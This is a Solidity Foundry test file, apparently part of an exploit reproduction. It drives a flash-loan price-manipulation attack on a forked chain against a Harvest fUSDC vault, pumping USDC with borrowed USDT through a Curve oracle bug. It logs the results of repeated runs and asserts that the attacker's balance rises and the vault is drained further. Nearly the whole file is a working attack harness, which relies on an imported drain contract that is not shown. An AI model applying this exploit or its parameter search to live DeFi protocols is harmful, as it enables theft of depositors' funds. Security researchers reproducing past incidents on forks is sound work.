// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/Run.s.sol";

/// @title Harvest Attempt 16
/// @notice Probes a USDT-funded sibling-vault branch against `fUSDC` on the clean reset head.
/// @dev Hypothesis: the previous `fUSDC` dead ends were specific to the DAI-funded mirror branch,
///      and the same Curve oracle bug may still be reachable by pumping USDC with flash-borrowed
///      USDT, then depositing the pumped USDC into the `fUSDC` vault before dumping back.
contract Attempt16 is Test, HarvestConfig {
    struct Config {
        uint256 outerFlash;
        uint256 innerFlash;
        uint256 pumpSize;
        uint256 dumpSize;
        uint256 iterations;
    }

    struct ExecutionResult {
        bool ok;
        string revertReason;
        uint256 currentNative;
        uint256 currentVault;
        uint256 executeGasUsed;
    }

    address payable internal constant ATTACKER = payable(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14);

    function setUp() public {
        vm.createSelectFork("ch2");
    }

    function test_probe_selected_config() public {
        Config memory config = Config({
            outerFlash: vm.envOr("HARVEST_TEST_OUTER_FLASH", uint256(5_000_000e6)),
            innerFlash: vm.envOr("HARVEST_TEST_INNER_FLASH", uint256(5_000_000e6)),
            pumpSize: vm.envOr("HARVEST_TEST_PUMP_SIZE", uint256(5_000_000e6)),
            dumpSize: vm.envOr("HARVEST_TEST_DUMP_SIZE", uint256(5_000_000e6)),
            iterations: vm.envOr("HARVEST_TEST_ITERATIONS", uint256(1))
        });
        uint256 maxRepeats = vm.envOr("HARVEST_TEST_MAX_REPEATS", uint256(1));

        HarvestTargetConfig memory target = HarvestTargetConfig({
            vault: FUSDC_VAULT,
            targetToken: USDC,
            fundingToken: USDT,
            outerPair: USDC_WETH_PAIR,
            innerPair: USDT_WETH_PAIR,
            soloFundingMarketId: 0,
            targetIndex: IDX_USDC,
            fundingIndex: IDX_USDT
        });

        uint256 nativeBefore = ATTACKER.balance;
        uint256 vaultBefore = target.vault.underlyingBalanceWithInvestment();
        uint256 ppfsBefore = target.vault.getPricePerFullShare();

        (bool success, uint256 nativeDelta, uint256 vaultDelta) = _probeConfig(target, config, maxRepeats);

        uint256 nativeAfter = ATTACKER.balance;
        uint256 vaultAfter = target.vault.underlyingBalanceWithInvestment();
        uint256 ppfsAfter = target.vault.getPricePerFullShare();

        console.log("REPEAT_TARGET:", "fUSDC_USDT_FUNDED");
        console.log("REPEAT_NATIVE_BEFORE:", nativeBefore);
        console.log("REPEAT_NATIVE_AFTER:", nativeAfter);
        console.log("REPEAT_NATIVE_DELTA:", nativeDelta);
        console.log("REPEAT_VAULT_BEFORE:", vaultBefore);
        console.log("REPEAT_VAULT_AFTER:", vaultAfter);
        console.log("REPEAT_VAULT_DELTA:", vaultDelta);
        console.log("REPEAT_PPFS_BEFORE:", ppfsBefore);
        console.log("REPEAT_PPFS_AFTER:", ppfsAfter);

        assertTrue(success, "selected config reverted immediately");
        assertGt(nativeDelta, 0, "selected config must raise native balance");
        assertGt(vaultDelta, 0, "selected config must drain the vault further");
    }

    function _probeConfig(
        HarvestTargetConfig memory target,
        Config memory config,
        uint256 maxRepeats
    ) internal returns (bool success, uint256 nativeDelta, uint256 vaultDelta) {
        IHVault vault = target.vault;
        uint256 snapshot = vm.snapshotState();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 vaultBefore = vault.underlyingBalanceWithInvestment();
        uint256 repeatCount;

        vm.startPrank(ATTACKER);
        HarvestDrainMulti drain = new HarvestDrainMulti(
            ATTACKER,
            target,
            HarvestRunConfig({
                iterations: 0,
                repeats: 0,
                outerFlash: config.outerFlash,
                innerFlash: config.innerFlash,
                soloFlash: 0,
                pumpSize: config.pumpSize,
                dumpSize: config.dumpSize
            })
        );
        vm.stopPrank();

        console.log("CONFIG_TARGET:", "fUSDC_USDT_FUNDED");
        console.log("CONFIG_OUTER_FLASH:", config.outerFlash);
        console.log("CONFIG_INNER_FLASH:", config.innerFlash);
        console.log("CONFIG_PUMP_SIZE:", config.pumpSize);
        console.log("CONFIG_DUMP_SIZE:", config.dumpSize);
        console.log("CONFIG_ITERATIONS:", config.iterations);
        console.log("CONFIG_VAULT_PPFS:", vault.getPricePerFullShare());
        console.log("CONFIG_VAULT_UNDERLYING:", vaultBefore);

        for (uint256 i; i < maxRepeats; ++i) {
            uint256 previousNative = ATTACKER.balance;
            uint256 previousVault = vault.underlyingBalanceWithInvestment();
            ExecutionResult memory result = _executeRepeat(drain, vault, config.iterations);

            if (!result.ok) {
                console.log("CONFIG_REVERT_AT_REPEAT:", i + 1);
                console.log("CONFIG_REVERT_REASON:", result.revertReason);
                break;
            }

            console.log("CONFIG_REPEAT_INDEX:", i + 1);
            console.log("CONFIG_REPEAT_GAS_USED:", result.executeGasUsed);
            console.log("CONFIG_REPEAT_NATIVE_DELTA:", result.currentNative - previousNative);
            console.log("CONFIG_REPEAT_VAULT_DELTA:", previousVault - result.currentVault);

            if (result.currentNative <= previousNative || result.currentVault >= previousVault) {
                console.log("CONFIG_STOP_AT_REPEAT:", i + 1);
                break;
            }

            success = true;
            repeatCount = i + 1;
        }

        nativeDelta = ATTACKER.balance - nativeBefore;
        vaultDelta = vaultBefore - vault.underlyingBalanceWithInvestment();

        console.log("CONFIG_SUCCESSFUL_REPEATS:", repeatCount);
        console.log("CONFIG_NATIVE_DELTA_TOTAL:", nativeDelta);
        console.log("CONFIG_VAULT_DELTA_TOTAL:", vaultDelta);
        console.log("CONFIG_VAULT_AFTER:", vault.underlyingBalanceWithInvestment());
        console.log("CONFIG_PPFS_AFTER:", vault.getPricePerFullShare());

        bool reverted = vm.revertToState(snapshot);
        require(reverted, "snapshot restore failed");
    }

    function _executeRepeat(
        HarvestDrainMulti drain,
        IHVault vault,
        uint256 iterations
    ) internal returns (ExecutionResult memory result) {
        uint256 gasBefore = gasleft();

        vm.startPrank(ATTACKER);
        try drain.execute(iterations) {
            vm.stopPrank();
            result.ok = true;
        } catch (bytes memory reason) {
            vm.stopPrank();
            result.revertReason = _decodeRevert(reason);
            result.currentNative = ATTACKER.balance;
            result.currentVault = vault.underlyingBalanceWithInvestment();
            return result;
        }

        result.currentNative = ATTACKER.balance;
        result.currentVault = vault.underlyingBalanceWithInvestment();
        result.executeGasUsed = gasBefore - gasleft();
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "empty revert data";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == bytes4(keccak256("Error(string)"))) {
            bytes memory payload = new bytes(revertData.length - 4);
            for (uint256 i; i < payload.length; ++i) {
                payload[i] = revertData[i + 4];
            }
            return abi.decode(payload, (string));
        }

        if (selector == bytes4(keccak256("Panic(uint256)"))) {
            return "panic(uint256)";
        }

        return "non-standard revert";
    }
}
